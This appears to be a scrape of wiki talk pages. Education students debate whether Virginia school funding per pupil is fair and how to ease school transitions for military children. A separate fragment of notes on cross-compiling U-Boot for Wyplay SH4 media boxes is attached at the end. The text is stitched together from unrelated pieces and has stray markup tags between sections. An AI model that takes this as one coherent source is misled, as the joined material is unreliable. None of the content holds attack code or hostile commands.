I think that all counties should have an equal amount they spend per child. If one county is richer than another I believe they should use the extra money for other things. That way tax payers will not get mad because their money is not going out of the county. Another option could be that the state regulate the amount each county spends per child. Maybe the state could come up with an average for all the counties in the state of Va, then distribute the money somewhat equally. However with this said, some counties have higher taxes while others do not. If a family cannot afford to live in that county that pays higher taxes then maybe the state can pick up the &quot;poor&quot; county they live in and help. Not sure that there is such a way this could happen. One question that I have is, does the state already do something like this? I believe that I have read something that is very similar to the guidelines that I just discussed. Does anyone know if this is true?[[User:Hcomb003|Hcomb003]] ([[User talk:Hcomb003|talk]]) 19:42, 22 July 2009 (UTC)


I believe that all schools in a state should be given an equal amount of money per student per year, plus an area cost of living adjustment.  I don't believe the more affluent schools should have to give up funds to a lesser affluent area and I don't feel I should have to pay higher taxes in my area to support schools in another area.  Funding should be equal and regulated by some state agency and all schools should have to meet the same minimum technology and supply standards.  I don't understand why all schools aren't already equal in this manner.  [[User:Sciaston|Sciaston]] ([[User talk:Sciaston|talk]]) 20:07, 22 July 2009 (UTC)


I think that Virginia's public school should be funded as equally as possible.  Before I moved back to Southside Virginia, I lived in the Alleghany Highlands in the second smallest county in the state.  In 2006, the per pupil expenditure rate was $12,441 compared to $8,271 in Mecklenburg County.  Unfair you say?  How does this happen?  It's simple..little county has a small tax base due to the majority of the land being owned by the federal government, a large resort, and Dominion Power.  Funding is based on an index from the state corporation commission which is the basis for school funding.  That equals more money for fewer students, which most would agree is unfair. I am willing to pay higher taxes in my locality which would benefit students in this county.  However, I am not willing to foot the bill for everyone else.  Lack of funding effects students and teacher alike.  We are tired of trying to keep up with the Jones' when we aren't even in the same neighborhood.  Modern technology is not considered a new notebook and two pencils (though for some it is).  It is time to look at the distribution of resources and find a solution to this funding dilemma.

So now, we must dive into the politics of the situation.  To be honest, this is not something I have to consider.  I do not have children, nor do I have the financial security to send someone else’s children to school.  I do not even think the wealthier, more affluent people in our country can afford a tax increase for education right now.  Otherwise, we would witness some type of reform going on in our current system.  Of course, I believe all children should have an equal, quality education regardless of socio-economic status.  I just do not think higher taxes are the best way possible.  Let us propose greater legislation.  More feasible solutions.  Are we really moving entirely away from our capitalist roots?  By the way, I attended Jonathan Kozol’s appearance at ODU.  What an honor that was!  He is magnificent!  [[User:Abitt002|Abitt002]] ([[User talk:Abitt002|talk]]) 04:24, 23 July 2009 (UTC)

Socialism? Um, no thanks. Correct me if I'm wrong, but isn't socialism bad? When Russia was (and still is) socialist, didn't America look on them with disdain because we were (are) a superior, free nation? Since that was (and still is) correct, why is it that today our leadership wants to make everything socialist? From insurance to healthcare, and now education? This is very wrong and should not even be considered. People claim they want to make education &quot;equal&quot;. Well, &quot;equality&quot; has two sides- the good and then bad. While this &quot;equality&quot; could mean that all students across America would have new, well-outfitted schools to attend, it could also mean that our (already in-debt) government would not have enough money to support all of the nations schools, causing a lowering of standards and putting schools in a worse place than many of them are today. Gone would be the chance for wealthy kids to attend private school or for gifted kids to attend magnet schools. And isn't all that the opposite of what all educators are trying to accomplish? In conclusion, &quot;equality&quot; is relative. [[User:Sbutl016|Sbutl016]] ([[User talk:Sbutl016|talk]]) 19:30, 24 July 2009 (UTC)

I strongly believe that there is a strong correlation between the quality of a child’s education and the economic status of their parents and neighbors. Since educational funds are usually collected by surrounding property taxes, it is sensible that higher quality schools are going to have parents who are in at least in the middle class. These parents also are more likely to do additional funding to school, through fundraising and donations. However, if the quality of schools depends on the local community, it does not seem entirely fair to children who attend schools with lower SES. Children never have a choice in where they live and go to school, and in many similar cases, neither did their parents. So the question of who should pay for schools in poor communities: the surrounding wealthier communities, the poor communities or someone else like the government? This is a very controversial issue because it involves a child’s education. One could argue that wealthier communities could afford to give a few thousand dollars more each year on less affluent students. Another side could dispute that they any community is responsible for education and that there is a risk that their own children would suffer from a some lack of funds, especially children with special needs. Personally, I think it depends on the attitudes of the privileged and underprivileged communities. I think if parents of poorer communities are willing to be highly engaged in their child’s education and make their community a more positive place, then I think that more affluent communities can spend more money. I would also be willing to pay higher taxes so that everyone can have a better education; however I know that there are many others who strongly disagree with that. These decisions are strongly influenced by political, social and moral aspects and will not exactly happen overnight.[[User:Adart001|Adart001]] ([[User talk:Adart001|talk]]) 17:32, 25 July 2009 (UTC)

Wow how unfair. I thought that our schools would be equal by now and yet another dilemma. I am not willing to pay more taxes for another child however, I do believe that the state should do something to regulate the use and distribution of the state tax to the schools in a manner that it would be distributed equal for all schools. Unfortunately we know that the rich support and create the rich. These communities who house the wealthy only attract and let in the wealthy therefore, the poor are not welcome and let's face it could not afford to live in these areas. Having communities separated by the level of financial achievement is what keeps this unbalanced system going. I do not thing that wealthy and middle class parents would not be happy if they know that their tax money would not be supporting their childs education or their immediate school system. As American citizens we should want and do everything possible so that all students are offered the same education but honestly I think this may be impossible. [[User:Bpenn005|Bpenn005]] ([[User talk:Bpenn005|talk]]) 00:23, 26 July 2009 (UTC)

The problem we are talking about is resources and funding for them...I feel sad for the kids who have to go to school without the basic necessities (desks that are usable, libraries, money for books, etc.). I have visited many different inner-city schools where the classrooms looked like war zones with paint peeling, big chunks coming off the walls, limited playground areas that are in shambles (not safe for children to play on), etc. While it would be nice for these schools to receive funds to purchase technology to keep up with the standards of affluent schools, it is not an option for them. I think that all schools should be equal in the basic necessities and things such as technology, after school programs, etc. should be something each school district can work on getting the money for their programs that make them stand out from other schools. As a parent of two, it is enough that my husband and I have to pay taxes for our own two...we do not have the extra funds to help other children at this time...that is where corporations, celebrities, politicians, and organizations can make donations to help support. I am not trying to put the bulk of responsibility on others, but I think that the above mentioned, have more resources to help the needy. We need to find a way without putting too much financial strain on the tax payer to make all schools equal for the just basics necessities.[[User:Scarlett1|Scarlett1]] ([[User talk:Scarlett1|talk]]) 03:04, 26 July 2009 (UTC)

I do think that this is a very unfair situation. However, I will not even begin to propose a solution, simply because I am not educated on the options. But I do think that within public schools, and especially in the same state, there should be standards and such that would limit funding for one school and provide funding for another. I would think that public schools should be &quot;more equal&quot; than this. [[User:Alucy001|Alucy001]] ([[User talk:Alucy001|talk]]) 03:09, 26 July 2009 (UTC)


It is indeed unfortunate that our schools continue to parallel the economic conditions surrounding them.  Just because children come from low tax paying households doesn't mean they should be robbed of essential resources and tools in the classroom.  Of anything these schools should be granted more funding.  Statistically, these are the schools with the highest drop out rates, these are the schools that need the strongest resources on their side. However, it is only fair that each child is awarded with the same opportunity as the next.  Everyone is deserving of a proper education, both rich and poor. In an ideal world, funding would be equally rationed to educational facilities. Yet, I'm afraid this is wishful thinking on my behalf as well as everyone that's written in this category.  Lets be real, though a step closer, the politics of this issue will continue to spawn controversy until we create a plan that both parties can agree on. [[User:Rpaige|Rpaige]] ([[User talk:Rpaige|talk]]) 07:21, 26 July 2009 (UTC)

It is unfair for anyone to not receive the same education as others due to socio-economic situation. Nevertheless, it is improper from the state to take as little as $8000 for each &quot;poor&quot; student and have better funding for those students that are better off. A generalized rate per student should be reached for each state in order to have a fair education system for all. [[User:Ehern004|Ehern004]] ([[User talk:Ehern004|talk]]) 16:12, 26 July 2009 (UTC)


Well, I can see this from both sides of the coin.  I am a mother with two daughters, one almost 9 and one 12.  We selected from many different houses to find one that would meet our needs as a family but also be in a good school district.  While there are many other houses that I wish we could have purchased in better school districts, they were not affordable.  I also am a student studying to be a teacher and find it grossly unfair that many students are stuck with whatever they get based on where they live.  This happens with technology, building upkeep, resources and most importantly teachers.  Very few teachers want to go teach at the school that is housed in an old building that has limited resources and the lowest economic group of students, but those are the schools that need great teachers the most.  Those are the kids that really deserve all of the resources that we can provide them.  The students that are attending school districts that spend more money on their students are generally coming from areas that have higher economic standards.  It should be no different.  There should be a state or federal mandate that sets the amount that should be for each student and the rest should go into a fund that helps to provide resources to schools that need them.  Many schools are able to form corporate partnerships and also raise money through PTA which helps to attain resources and supplies that could not be funded by the school.  While I am a tax payer and did the best I could to move into the right house so that my daughters were in a good school district that would help them it is still the responsibility of me as a parent to help my children achieve their educational goals, no matter where we lived.

I think that it should be controlled a little better. It would be a differently story if it was only like a thousand dollar difference but a thirteen thousand dollar difference is a little crazy. The state of MA should be able to regulate it a little better. I also don't think that taxes need to be raised, just the way that the money is spent needs a little revision. For instance, if they left the taxes the same and just sent a small amount to the neighboring community then maybe the difference wouldn't be so bad.

This is true, and it is an unfortunate circumstance.  There needs to be a change in how this work.  Yes, I would be willing to pay higher taxes to help the education of a student in a poorer area.  Or pay the same amount and have the money be distributed more evenly across the country.  It seems that poverty is one of the most influential factors in slowing students' educational progress.  Therefore, some serious educational and social reform needs to take place with the central focus of the reform being how to combat poverty.

== Those poor kids' parents could move to a better neighborhood. I'm not taking money away from my kids to give it to them. ==

Generally speaking, the rich get richer and the poor get poorer.  The way our schools are funded is something endemic to the American way of life and thinking, I contribute more, thus I get more. It is not at its heart a flawed ideal, it has made America what it is today in many ways (for better or worse).  In a selfish human sense, the only sense we can use, this system is pretty much as close to fair as one is going to get in the broad scope of things. The question I think becomes not is this system fair, because a fair system is never possible, but rather is there a better compromise available. Almost certainly yes, many things about the way our schools are funded can and should be fixed. But I don’t think that rich communities should be penalized merely for having more, or limiting their expenditures on students.  That ends well for neither party and just creates more animosity.  Taxing people for the benefit of others, has never been popular in America, and while I may say with my bleeding heart firmly pinned to my sleeve that yes, people should be taxed for the benefit of others, I accept the fact that that is no where near a “fair” system and is a biased viewpoint.  

In the end the question comes down to, would I personally be willing to pay more to improve someone else’s child’s education? And the answer is, in my heart of hearts, “How much would I be making yearly in this scenario?” 

Because being altruistic is nice and all, but we're all utilitarians when no one is looking. [[User:BitterAsianMan|BitterAsianMan]] ([[User talk:BitterAsianMan|talk]]) 17:05, 26 July 2009 (UTC)


For the most part, I do believe the following statement is true.    The quality of a child's education in America is a function of the wealth of his parents and neighbors.  Although with every rule there are exceptions.  Wealthier school systems tend to have more resources and more equipment.  But, the questions lie in how a teacher uses these resources.  Does more mean better?  Or does being practical have its advantages?   I do find this to be fair.  What you are saving in property taxes can be used to further their education at home.  Communities should be allowed to spend whatever money they have collected for education.  They should not be required to give some of their money to the poor communities.  The taxes they pay go toward services in their jurisdiction.  If families in the poorer communities want those resources, they are within their rights to move.  I have a hard time saying, &quot;money means better&quot;.  The law requires free and appropriate education.  The law does not require a certain dollar amount to be spent per pupil.  If the parents of the students in poor communities think that more resources means better education then they should move or find another alternative for their child.   I would focus my attention on if the teachers are doing the most they can with what they have available.  I would not be willing to pay higher taxes in my community for someone else's kid till it was proven to me that they were not being provided a appropriate education.

== Uh...is there another option? ==
As appealing as Socialism is there has to be a middle ground. No it's not fair that poor communities have less money for their schools.  However it is just as unfair to the communities that have more resources not to use them because of an unfair advantage.  It would be great if all things evened out but that almost never happens in any society.  I would like to point out that in Communist Russia and China that there is a great emphasis on education and the Government run program worked fairly well.  In Russia students were tested early for their gifts or skills and then placed in appropriate schools that would nurture that talent. 
But this is America where we can chose our own destiny and I know that the poverty cycle is vicious and hard to get out. The solution is not going to be solved by Robin Hood taking from the rich to give to the poor.  Perhaps the solution is generalized school funding. Each school is given the same amount of money each year, or base it on the cost of each student. It costs X amount of dollars per student and this scool has 800 students so; 800X = amount given to school. I would end the funding by income tax process. Where as this process works for many areas in Hampton I imagine there are some it does not work for. We need to make the system work for everyone. If we can level the playing field a little (which has never been done in history) we can truly offer opportunity for everyone.[[User:Jnemo001|Jnemo001]] ([[User talk:Jnemo001|talk]]) 06:29, 27 July 2009 (UTC)

Fair no, Reality yes, it is unfortunate that situations similar to this exist. At a little over 3 to 1 ratio that is extreme. If the property owners are willing to pay more taxes for the education of the local children, that is one advantage of living in a larger city. Although on the State level I would hope that something could be supplemented to allow for the discrepancy in funding.[[User:Mlipl001|Mlipl001]] ([[User talk:Mlipl001|talk]]) 02:53, 26 July 2009 (UTC)

No I do not think it is fair for students of poorer communities to have less than students of wealthier communities. But, I also do not think it is fair for those parents that are more well off to have to pay more money in taxes for someone else ... I don't think we should become a socialist country and the &quot;rich have to give to the poor&quot; ... seems like government spending could be taken from one area that the government really doesn't need to spend in and put that money towards the schools that could use more funding ... [[User:Hcogg001|Hcogg001]] ([[User talk:Hcogg001|talk]]) 16:00, 26 July 2009 (UTC)


Nothing is ever black and white, especially in this day and age. I believe that the discrepancies in moneys spent per child will never be resolved, nor is it necessary that the gap be closed. Instead, there should be a minimum amount that must be spent per child no matter the district. However, if the minimum is met across the board, then the more affluent neighborhoods should not be penalized for having more income. If not all portions of the district can met the minimum, then the necessary amount needed to met the minimum should be allotted from the rich to the poor, being sure to take only as much as is needed. This way socialism is not instituted, but at the same token, everyone has at least a decent starting point.[[User:Scrai010|Scrai010]] ([[User talk:Scrai010|talk]]) 23:07, 26 July 2009 (UTC)</text>

As this is a military town many of you are (or have friends who are) so called &quot;military brats&quot;. 

From what I hear, life as a &quot;military brat&quot; is not easy: moving from town to town, having to make new friends every two years. 

And then there's school: a new one every few years. Sometimes curriculum aligns; sometimes it doesn't.

What can be done to make school transitions easier for kids whose parents are in the military? 

Should we have a national curriculum so the topics for instruction will be consistent across the states? Special military school similar to the DODD (Department of Defense Dependents) [http://www.dodea.edu/home/index.cfm]schools in other countries? Something else?


&lt;/span&gt;

== Listen to my horror story! ==
Oh my where do I begin...my husband has been in the military for over 15 years and I have two daughters (one 16 and one going to be 7 next month). My 16 yr old has had it the hardest. We have moved all over the world and she has attended many schools. The problem that we have found, along with the socialization and adjusting aspect, is the curriculum in the different school districts she has attended. Two of the schools she attended tried to hold her back and move her back a grade because they said that her previous schools were substandard. Getting her help in reading and math, has been a struggle in some of the schools. In Hawaii, for instance, military students were told that they could not play sports for the school because since they were in the military, they would be leaving in three years or less...the coach told them that he did not have time to waste on them (this was not just one school in particular, but several)...as a result, many of the wives out of my husbands command moved back to the mainland without their husbands so their children could play sports. One of the best types of schools that she went to was the DOD school overseas...this was not because the curriculum was top notch or the sports program was outstanding...it was simply because all of the kids going there were military kids and the teachers understood what the kids were going through emotionally when their dad or mom or both went on deployment. Instead of punishing the kids for misbehaving, having emotional breakdowns, skipping school, etc...they worked with the kids, sometimes one-on-one to help them understand what was going on and how to survive the deployment. There is a really good website if you are interested in hearing stories or finding out more information about military kids: http://www.militarybrat.com/

My father grew up in a military family where his father was a Colonel in the Air Force. He moved sixteen times from the time he was age 3 until age 18.  On top of being mobile he was later diagnosed (in his adult years) with an extreme case of Attention Deficit Hyperactive Disorder.  He had a really difficult time adapting to the varying curriculum and cultures in each location.  Once he got comfortable making friends and such he would have to move.  I'm not sure if his problems derived from lack of stability due to being so mobile or ADHD... or both.  All I know is the moving didn't help his cirumstances.  Perhaps having a set curriculum for those in the military would assist in creating some sort of stability. I do think it is a good idea, I would just be careful not to ostracize these children from the general population creating yet another hurdle to jump.

Being a so called &quot;military brat&quot; myself I did experience the moving around and the new schools. It wasn't so bad when I was younger because i didn't really notice the differences in the . I first noticed it when i moved from Virginia Beach to Tennessee in between the fourth and fifth grade. I was in a private school in VA and a public school in TN. I noticed that some of the material that the kids in my class in TN were just learning for the first time I had covered the previous year in VA. The other time I noticed a difference was Moving back to VA a year later. Except this time I was the one that was behind. I think that what could be done is not necessarily one set national curriculum, but a set of guidelines that will help keep grades on the same page throughout the country.

== That's not how it was for me. ==

I did not grow up in a military family but do have many friends who have traveled the globe as &quot;military brats&quot;. In my experience with them, I often heard complaints about the moves and the difficulty settling into each new school. I think that the curriculum differences can be very difficult for children whose parents travel frequently; however, I believe it is the social aspect of the moving that is most difficult. In almost all the cases that I have seen, the children have adapted well to the new school curriculum. I think that when the social transition is a smooth one, the school aspect goes well too. Military brats generally become very resiliant and are quite good at making friends and settling into new places quickly. If this is done, I think that the educational aspects will also be much easier. I am not sure of a solution to the issue of varying curriculums; I don't know that I completely agree with a national curriculum. As for the military families and children, I would focus on making a smooth transition (socially) into the new home/ school and the rest will fall into place!

I have never experienced this personally but I do have friends that are the children of parents in the military.  They would tell me that yes, there were some hard times, but overall they enjoyed being in the military.  They enjoyed being able to see different parts of the world and meeting different people.  Never, did they mention it being difficult going from school to school with the academics.  Not to say this is not a problem and that not everyone has or had problems with being in a military family..it varies.  I am not sure whether a national curriculum would be the best but at the same time I am not sure it would be a huge problem.  It does take a lot of effort and time to make a whole country on the same page academically. [[User:Sston008|Sston008]] ([[User talk:Sston008|talk]]) 23:35, 25 July 2009 (UTC)

I did not grow up in a military family, however, I had friends who's parents were in the military and it was always hard to see them go for me.  I can only imagine how hard it was for them having to make new friends every place they moved too.  I think a national curriculum would be a great idea, but it actually happening, I just do not know if it will.  Every teacher teaches differently and has their own style.  It would be hard to keep track of all the teachers in all the schools to make sure they are all doing what the curriculum is stating.  I do not believe a national curriculum would be nice, but I do not think it will happen.  I do wonder if schools would be different if a curriculum was in place.

Well this is not a story about me, but it is about my first cousin who is considered a &quot;military brat&quot;. He has moved schools so many times I have lost count. It seemed like it was not a big deal at first but as he got older we began to notice how the moving affected him not only in school, but socially also. It always came down to one thing each time; either he was bored with the material because he already learned it or he was very far behind. He was never anywhere for such a period of time that he could make friends. By the time kids would start warming up to him he would have to move. I think a national curriculum would be great but I don't think it is possible. No teacher teaches at the same pace or the same. He has been in the same school now for 3 years and is begging to stay so he can graduate there. He has close friends there that he never has had before. He is highly intelligent and I wonder where he would be without support from his parents and his self determination.

My oldest son is a military brat.  He attended 9 different schools by the time he graduated high school.  The longest he ever stayed in one school was 2 years and he only did that twice.  Most of the time, there were many other students in the same circumstances as he was so he and those other students made friends quickly as they understood the situation.  Curriculum issues were a totally different matter however.  He was considered a &quot;gifted student&quot; but because qualifications were different everywhere he went, he usually didn't attend those programs.  He was very bored in school and had poor study habits because the work came easily to him (until he hit college that is).  I don't believe in a national curriculum, but I do have to wonder how much better off he would have been had there been one.

I did not grow up in a military family, but I have some friends who did. Other than the stresses of having to get used to a new area and make new friends, they did not have many problems adjusting to the school. I think that military students should be given some assistance in catching up to the same place as the other students of their age group, but they do not need a standardized national curriculum.

The only time I personally had to move away from home was college, and it was a hard transition as a grown young adult. However, when it comes to military brats my niece is the perfect case. My brother joined the army a little shy of ten years ago and she has had to adapt to different countries and cultures. They have not mentioned that adapting to different types of curricula is hard but the social bonding is what has made each of their (especially my little niece)moves difficult. Maybe military brats should be exempt from harsh curriculum requirements and take placement tests to meet the needs of each school.[[User:Ehern004|Ehern004]] ([[User talk:Ehern004|talk]]) 16:31, 26 July 2009 (UTC)


While I am technically not a military brat, I did move overseas when my mother took a government job and I did attend a DODDS school there.  I had a great experience.  I thought the teachers were understanding and did their best to make me feel accepted and secure in my studies.  We did move during the school year so there was some transition as far as getting on the same page but there was some leeway with the teachers and they helped me by assigning someone in my class that would &quot;tutor&quot; me and help me to catch up.  The worst part of the transition was the year that it happened, my freshman year of high school, which is hard enough already, add moving to another country on to the stress.  I think that there is a sense of national curriculum in a way in that many teachers understand that sometime in our life as students that we will be taking an SAT or ACT and there are standards that are taught to help students prepare for those tests.  The benefits that I gained by living in Europe and experiencing history, art, culture and language first hand; when to that point had been in books and media, was an experience that made me grateful for the tears that were shed about going.  There are always going to be struggles when you do something new and foreign to you but in the end those experiences help you and teach you things about yourself.  It does not hurt that everyone else in the schools overseas are all in the same boat, so you make friends easily.  I am sure that it is harder when you move from state to state, but there should be assistance from guidance counselors and administration to help smooth the transition.

I grew up in a military family but only had to endure one major move. I moved from Hawaii to Virginia and that was that. My mother was always the head of my household and I am sure that this had a lot to do with our lack of movement. My father did ,however, spend three years away from the family stationed in Madagascar and a horrific stint as a recruiter in Danville Virginia. I would’ve liked to have lived in Madagascar, but feel that missing out on that specific pleasure in order to avoid the circle of hell that is Danville Virginia was worth it.  My sincerest apologies to anyone who hails from Danville or thereabouts, I have only visited three times with my father and, admittedly, only to his seedy motel room. But from what I saw, having my eyelids cut off and my eyes slowly dry in the hot summer sun seemed preferable to living there. 
So all in all, I did not have a horrific experience due to my father’s military involvement. But I am sure things would’ve been different if my mother were not the primary earner in my family. I do feel cheated of time in regards to my childhood with my father but then again I was never subjected to living someplace I didn’t want to or losing what little social connections I made as a child. Most importantly I avoided living in the purgatory of Danville, Virginia. [[User:BitterAsianMan|BitterAsianMan]] ([[User talk:BitterAsianMan|talk]]) 18:45, 26 July 2009 (UTC)



== Here's my solution... ==
I didn't grow up in a military family, so I don't know anything about the moving to one school to another. I can only imagine that this is very hard on the student(s) that have to go through this. I don't think that there is an easy solution to this situation.  Depending on how long the student would be at the school, the curriculum should be geared towards giving the student the best education to help him/her to the next school.[[User:Msmhobbs04|Msmhobbs04]] ([[User talk:Msmhobbs04|talk]]) 13:56, 30 July 2009 (UTC)


I didn't grow up moving from school to school but I can see the difference in the education system from state to state. My oldest son is starting high school this year. He has two cousins and one Aunt who are the same age and in the same grade (yes an Aunt). They all live in different states; VA, NY, NJ, and GA. The level of knowledge is vastly different.  My niece and sister in NY and NJ have read many literature books, have written large essays as well have constructed projects in science. My sister who is an English teacher is shocked that my son barely has to write essays or research papers and compared to her 9th grade students he is way behind in literature.  This holds true for my nephew in GA. I don't feel as though my son is learning as much as he needs to in order to be well rounded in academics.  I am not going to debate the role of parents in this situation.  If I moved back to NY I coul see where the school system would want to hold him back or offer tutoring.  I also would like to point out that my son scores almost perfect on his math SOL's and holds a good grade in school generally but even the level of math he is learning is a grade behind what my niece and sister are learning.  So just because it looks good on paper doesn't make it right. Are some school systems dumbing down the curriculum so they can show achievement? I believe that there needs to be a national curriculum with the exception of a studying local and state specific genres.[[User:Jnemo001|Jnemo001]] ([[User talk:Jnemo001|talk]]) 06:01, 27 July 2009 (UTC)   




The DOD schools sound like something nice for students in military families to attend. Not only do they get the same education curriculum wise across schools, they also are able to meet lasting friends that have similar experiences moving around and changing schools. The teachers are also more understanding and able to help students adjust to the new school and classes. [[User:Hcogg001|Hcogg001]] ([[User talk:Hcogg001|talk]]) 16:16, 26 July 2009 (UTC)

I agree with a national curriculum in some fashion, but not because of the military...just sometimes think education should be a national issue and not a state regulated thing.  Why not have standards of learning for the country, not just the states.  As for the military children, I do believe that assistance is needed for them so they can better fit in in their new classes.  Moving so much is devastating for young people.  Of course, around here children are not alone in their military-bratiness.  Classmates have gone through it too.  Counselors should be sensitive to the fact that there are so many students in transition in our area and a system should be in place to assist them with their special issues. [[User:Ldomm002|Ldomm002]] ([[User talk:Ldomm002|talk]]) 02:52, 26 July 2009 (UTC)

I do not agree with a national curriculum, but I definitely believe some kind of plan needs to be implemented for those kids of military families.  I certainly believe it could be very hard for students to adjust moving so many times.  Each time you may be behind or ahead of the curriculum, either circumstance could be frustrating.  Honestly, not sure what a good answer would be.  I hope that schools understand and are patient with these students whether they have to catch up or if they are ahead.  I believe every circustance would be different.  Each student should be evaluated and each teacher should adjust accordingly.

I feel that there should be some kind of program in place as a transition for military students. Since every curriculum is not going to be the same at each school, it would be beneficial to accommodate these students with an introduction to the new school's curriculum. In that introduction, the student will be introduced to the new school's curriculum, and how it is different from their previous school's. They will also be given time, and information to adjust to the new curriculum so a smoother transition can be achieved. I do not feel that there should be a special curriculum put into place just for military students, because then they will feel segregated from the other students at their school. I do feel however that implementing a program, or programs, to help facilitate the transition to the new curriculum would be beneficial to these military students who are moved from school to school.

Although I wish I had the perfect solution for military students, it’s very difficult to come up with one.  I  was not one to favor a National Curriculum before, but in the case of military students, I think a national curriculum would be beneficial. That way, the topics of instruction would be consistent across the states and parents and students would not have to worry about the whether the curriculums are aligned. I was never a military student myself, but I have had a few good friends who have been, and this has always been a frustration for them. I think it would be a much easier academic transition for the student if they could count on the curriculum being the same wherever they went.

While I think there should be a very loose national curriculum across the United States to help especially with situations such as this, I don't think it should be so authoritarian as to dictate completely and utterly what we can teach. There should be so much wiggle room you could dance with a two-left footed, epileptic elephant. [[User:Hsmit022|Hsmit022]] ([[User talk:Hsmit022|talk]]) 17:27, 24 July 2009 (UTC)


Transitioning to a new school is very difficult.  Students from military families move often which forces children to enter several new schools.  I do not believe a national curriculum is the answer.  I believe most schools attempt to make this transition as smooth as possible and often offer additional assistance to new students, especially non-Virginia residents.  Entering a Virginia public school and facing the SOLs is a daunting experience for a child who has never had to meet such requirements.  Teachers are concerned with &quot;catching up&quot; students on new material and preparing them for testing.  Additional instruction and assistance to fill in the cracks is valuable.  I believe a positive partnership between the school staff and the family can make a stressful transition a wonderful experience.  Let the student and parents know that you are there for them and not to hesitate to ask questions or for assistnace. You can't make up for all of the moving and changes but you can certain try.   And of course a smiling face makes a world of difference!  [[User:Acrow005|Acrow005]] ([[User talk:Acrow005|talk]]) 23:42, 22 July 2009 (UTC)

Although I know nothing of coming from a military family, I understand that moving many times for a child is pretty devastating.  Many of my friends come from military families and have explained the difficulties of these transitions to me.  Some children feel isolated, lack confidence, and never really find stability in their education.  Other children have explained to me that they simply got used to moving around all the time and that eventually it was not a big deal.  Regardless of which mold a child fits in, the truth is that we still need some kind of national standards to abide by.  I have read a lot of research on federal curriculum and do not see any problem with the idea.  Why shouldn’t Susan from Arkansas have the same education requirements as Amber from New York?  The problem…education has always been a state’s obligation.  Now, instead of reform, or even trying a uniform curriculum, states and federal government just get lost in the arguments and debates of it all.  In the meantime, states still have control and I see no promising way to ease the transition for military students, other than teachers doing their best to be more aware of the emotional needs of the “new kid”.

Whether a child is part of a military family or not, school transitions are never completely easy. Besides switching teaching styles and course content, children have to leave old friends and social groups and form new ones. Although finding new social groups will depend on the student, there is a possible solution for school transitions. By having a national curriculum in at least public and DODDs schools, students do not suffer academically. However, there are some disadvantages of a national curriculum. The most obvious is that education is primarily managed by the government at state and local levels. A national curriculum would contradict one of the very foundations of our national government. Another major issue is that each state has different views on what should, or should not be taught. For example, Virginia tends to only focus on a very small perspective of local history that includes minorities while California focuses strongly on all minorities in the area. If a national curriculum were to be developed, how would the country decide what a child should be taught? Would a national vote occur or would representatives from each state decide?

These questions are really difficult to answer because one year of experimental education can be extremely beneficial or damaging to a generation of children.  As a military brat myself, I understand too well the frustration of constantly switching schools and being significantly ahead, or behind, my peers. I do not know if a national curriculum is entirely necessarily because I strongly believe that education should always be left within the state’s hands. Some national influence is acceptable, and sometimes even necessary to improve the country’s education system. But for the most part, education should be left to the states. I have noticed that the national associations for math, science, language arts and social studies each of standards of what a child should know kindergarten to 12th grade. Perhaps those should be a national standards and a national curriculum would be based on that. [[User:Adart001|Adart001]] ([[User talk:Adart001|talk]]) 01:30, 26 July 2009 (UTC)

I'm really not sure how I feel about this situation. I also agree that education should be left up to the state, so a national curriculum would obviously over-step that. I am not from a military family, but I would think that it would be emotionally harder for child to switch schools than it would be academically. This is why teachers should be aware of student's situations so that they can accommodate for this. Perhaps the student could receive extra help, if needed, from some type of after school program in high military areas? I don't know the solution, but I don't think that a national curriculum is the answer. [[User:Alucy001|Alucy001]] ([[User talk:Alucy001|talk]]) 03:17, 26 July 2009 (UTC)


I think that there should be a national curriculum to make sure that the entire nation is up to the same level of education as they should be state wide. I think that is education was the same nation wide, that allot of deficiencies could be avoided within students. When you travel allot and you have to get used to a new setting and probably differents standards each time I am pretty sure that may take some people through a loop and cause confusion.[[User:Bpenn005|Bpenn005]] ([[User talk:Bpenn005|talk]]) 03:38, 26 July 2009 (UTC)


Solution? I wouldn't go that far, but at least here are my thoughts...Schools are under the legislation of individual state governments, which usually dole out responsibility to individual cities or townships. The federal government's intervention into the states' rule over education has already been demonstrated by the No Child Left Behind Act. Due to the trickle down effect of that action, states now more frequently and forcefully intervene in local governments' legislation of schools. Should a national curriculum be mandated, this will be an even further limitation of state power, and thus city power to control its own educational systems. Because of the already negative effects of NCLB, and the &quot;dumbing down&quot; of standards to meet such legislation, the backlash of a national curriculum that may &quot;dumb down&quot; the affluent and well off schools as well as the power they exert in the community, may be enough to hasten the adoption of any such national dictation of the specifics of education. However, that does leave quite the plight for those who move frequently, i.e. military brats. To avoid such hassle, those children should have access to federal schools that share the same curriculum as to not impede on states' power to determine the specifics of their education system, and also to help facilitate the unique needs of military families. [[User:Scrai010|Scrai010]] ([[User talk:Scrai010|talk]]) 23:23, 26 July 2009 (UTC)

School systems in areas that have a large number of military transfers should have guidance counselors that have had some background in dealing with military families.  Having that training might give the counselor some insight into needs and issues that are common for military families in transit.  An example of this is a family that just moved into our district from Europe and has had to deal without furniture at their house.  They were told it wouldn't be here for a few weeks.  This greatly effects how a student would perform in school.  
I do not believe in a national curriculum.  In Virginia we have some unique issues that we would want to focus on, but we wouldn't expect the students in Wyoming to care about the Chesapeake Bay Watershed.  I do believe there should be guidelines for transfer credit being accepted at schools, similar to that of transferring credit in college.  [[User:Jtmitchem|Jtmitchem]] ([[User talk:Jtmitchem|talk]]) 02:18, 27 July 2009 (UTC)

The solution is to give military kids credit for what they have already taken.  Guidance counselors should try to plan military transfer students schedules so that they do not have to repeat anything they have already done.  But I believe the solution is that military transfer students should get extra leniency; instead of having to do a whole course over, they should be excused from a graduation requirement.  Special summer school course opportunities should be available for military students.  These summer school courses should be specifically designed for summer school students, and the content of the course should be flexible based on what the student needs.  This will help make the transition less difficult. [[User:Mbrowder|Mbrowder]] ([[User talk:Mbrowder|talk]]) 17:46, 16 August 2009 (UTC)</text>

==== Looking inside in code ====
In source code provided by wyplay exists one uboot-&lt;version&gt; folder
Trying to guess how is compiled, inside uboot we found board folder and inside this one a sub-folder called wyplay, that may be the especifications needed to compile uboot for the different wyplay motherboards.
*Reviewing Makefile found in the main folder uboot-&lt;version&gt;, a different (entrada) can be found for the different wyplay boards. We are trying to configure and compile for wymdbox_config (wyplayer multimedia box) that we understand is what corresponds to this multimedia disks.
*The Make fails cause lack of SH4 compiler (¿?) That seems to be the processor architecture of multimedia disks. (Especification: http://lars.nocrew.org/computers/processors/SuperH/sh4cpu_sh1.pdf).
*toolchain has been compiled for crossed-compilation for this architecture: http://wiki.debian.org/SH4/CrossToolchain
*u-boot has been compiled for the wymdbox.
*Apparently the firmware kernel file includes u-boot and kernel.

